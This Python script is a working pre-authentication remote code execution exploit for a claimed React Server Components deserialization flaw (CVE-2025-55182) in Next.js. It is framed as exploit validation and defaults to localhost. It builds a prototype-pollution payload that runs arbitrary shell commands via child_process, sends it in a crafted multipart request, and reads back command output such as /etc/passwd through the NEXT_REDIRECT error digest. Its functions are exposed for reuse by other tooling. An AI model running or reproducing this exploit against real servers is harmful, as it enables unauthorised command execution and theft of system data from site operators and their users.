#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) Exploit Validation Script
Payload format based on OffSec and Trend Micro verified PoCs.

Tests genuine pre-authentication RCE via React Server Components
Flight protocol deserialization in Next.js 16.0.6 / React 19.2.0.

Uses the NEXT_REDIRECT error technique to exfiltrate command output
directly in the HTTP response. Works from any network location.

Usage:
    python3 validate-react2shell.py [target_url] [command]

Examples:
    python3 validate-react2shell.py http://localhost:7777 id
    python3 validate-react2shell.py http://localhost:7777 "cat /etc/hostname"
    python3 validate-react2shell.py http://TARGET:7777 "cat /etc/passwd"

The payload builder and command runner are exposed as module-level functions
(build_payload, send_payload, parse_digest, run_command) so other tooling can
reuse the same proven exploit path without duplicating it.
"""
import json
import re
import sys

try:
    import requests
except ImportError:
    requests = None


def escape_for_js(cmd):
    return cmd.replace("\\", "\\\\").replace("'", "\\'")


def build_payload(cmd):
    safe_cmd = escape_for_js(cmd)
    js_code = (
        "var res=process.mainModule.require('child_process')"
        ".execSync('%s',{timeout:5000}).toString().trim();"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:res});"
        % safe_cmd
    )
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": js_code,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }


def build_body(payload):
    return (
        '------Boundary\r\n'
        'Content-Disposition: form-data; name="0"\r\n'
        '\r\n'
        '%s\r\n'
        '------Boundary\r\n'
        'Content-Disposition: form-data; name="1"\r\n'
        '\r\n'
        '"$@0"\r\n'
        '------Boundary--'
    ) % json.dumps(payload)


def send_payload(target_url, payload, timeout=10):
    if requests is None:
        raise RuntimeError("requests library required")
    body = build_body(payload)
    headers = {
        "Next-Action": "x",
        "Content-Type": "multipart/form-data; boundary=----Boundary",
    }
    return requests.post(target_url, data=body.encode(), headers=headers, timeout=timeout)


def parse_digest(text):
    """Return the exfiltrated command output from a NEXT_REDIRECT digest.

    Returns None when there is no digest, when the digest could not be parsed,
    or when the digest is a short numeric hash (which means the error fired but
    the command output was not exfiltrated).
    """
    if "digest" not in text:
        return None
    match = re.search(r'"digest":"(.*?)"', text)
    if not match:
        return None
    value = match.group(1)
    if value.isdigit() and len(value) < 15:
        return None
    return value


def run_command(target_url, command, timeout=10):
    """Execute command on the target via CVE-2025-55182.

    Returns (status_code, output, raw_text) where output is the exfiltrated
    command output string, or None if exfiltration did not occur.
    """
    resp = send_payload(target_url, build_payload(command), timeout=timeout)
    return resp.status_code, parse_digest(resp.text), resp.text


def main():
    if requests is None:
        print("[!] Python 'requests' library required: pip3 install requests")
        sys.exit(1)

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:7777"
    command = sys.argv[2] if len(sys.argv) > 2 else "id"

    print("[*] CVE-2025-55182 (React2Shell) Exploit Validation")
    print("[*] Target: %s" % target)
    print("[*] Command: %s" % command)
    print()
    print("[*] Sending NEXT_REDIRECT exfiltration payload...")
    print()

    try:
        status_code, output, raw_text = run_command(target, command)
        print("[*] Response status: %d" % status_code)

        if output is not None:
            print("[+] SUCCESS! Command output via NEXT_REDIRECT exfiltration:")
            print("    %s" % output)
            print()
            print("[+] CVE-2025-55182 RCE CONFIRMED")
        elif "digest" in raw_text:
            print("[!] Digest present but output was not exfiltrated (hashed digest).")
            print("[!] The payload may have thrown a different error.")
            print()
            print("[*] Response body: %s" % raw_text[:500])
        else:
            print("[!] No digest in response")
            print("[*] Response body: %s" % raw_text[:500])

    except requests.exceptions.ConnectionError:
        print("[!] Connection error (reset or refused)")
        print("[!] Check that the target is reachable and Next.js is running on port 7777")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        print("[!] The server may be processing the request -- try again")
    except Exception as e:
        print("[!] Error: %s" % e)

    print()
    print("[*] Done")


if __name__ == "__main__":
    main()
